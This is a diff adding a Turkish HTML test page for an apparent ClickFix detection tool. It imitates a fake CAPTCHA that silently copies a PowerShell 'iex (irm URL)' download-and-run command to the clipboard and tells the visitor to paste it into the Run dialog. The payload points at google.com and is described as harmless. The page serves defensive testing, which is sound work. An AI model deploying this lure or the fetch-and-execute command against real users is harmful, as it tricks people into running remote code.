@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8" />
+<title>Seviye 2 – Sahte CAPTCHA + Clipboard Hijack</title>
+<style>
+  body { font: 15px/1.6 -apple-system, Segoe UI, sans-serif; max-width: 640px; margin: 60px auto; padding: 0 20px; }
+  .box { border: 1px solid #d0d0d0; border-radius: 8px; padding: 24px; text-align: center; }
+  .check { display: inline-flex; align-items: center; gap: 10px; border: 1px solid #ccc; border-radius: 6px; padding: 10px 16px; cursor: pointer; background: #fafafa; }
+  .check input { width: 18px; height: 18px; }
+  #instructions { display: none; margin-top: 24px; text-align: left; }
+  code { background: #f2f2f2; padding: 10px; display: block; border-radius: 6px; word-break: break-all; }
+  .banner { background: #fff3cd; border: 1px solid #ffe08a; padding: 12px; border-radius: 6px; margin-bottom: 20px; text-align:left; }
+</style>
+</head>
+<body>
+  <div class="banner">
+    <strong>ClickFix Guard test sayfası – Seviye 2.</strong> Kutuyu işaretleyince JS sessizce
+    <code>navigator.clipboard.writeText()</code> ile panoya bir PowerShell komutu yazar; instructions
+    div'i o ana kadar DOM'da <code>display:none</code>'dır (gecikmiş DOM enjeksiyonunu test eder).
+  </div>
+
+  <div class="box">
+    <h2>Güvenlik Doğrulaması</h2>
+    <p>Devam etmeden önce lütfen insan olduğunuzu doğrulayın.</p>
+    <label class="check">
+      <input type="checkbox" id="verify" />
+      Ben bir robot değilim
+    </label>
+
+    <div id="instructions">
+      <p>Doğrulama tamamlandı. Devam etmek için:</p>
+      <ol>
+        <li>Windows tuşu + <strong>R</strong> ile Çalıştır'ı açın (ya da PowerShell açın)</li>
+        <li><strong>Ctrl+V</strong> ile yapıştırın</li>
+        <li>Enter'a basın</li>
+      </ol>
+      <code id="cmd-display"></code>
+    </div>
+  </div>
+
+  <script>
+    // Zararsız test payload'ı: google.com HTML döndürür, PowerShell parser
+    // olarak parse edilemez ve iex hata fırlatıp zararsız şekilde durur.
+    const payload = "powershell -NoProfile -Command \"iex (irm 'https://www.google.com')\"";
+
+    document.getElementById("verify").addEventListener("change", (e) => {
+      if (!e.target.checked) return;
+      document.getElementById("cmd-display").textContent = payload;
+      document.getElementById("instructions").style.display = "block";
+      navigator.clipboard.writeText(payload).catch(() => {
+        // Clipboard API bazı bağlamlarda kullanılamayabilir; test sayfası olduğu için
+        // execCommand fallback'i de deniyoruz (klasik ClickFix kitlerinin yaptığı gibi).
+        const ta = document.createElement("textarea");
+        ta.value = payload;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand("copy");
+        document.body.removeChild(ta);
+      });
+    });
+  </script>
+</body>
+</html>
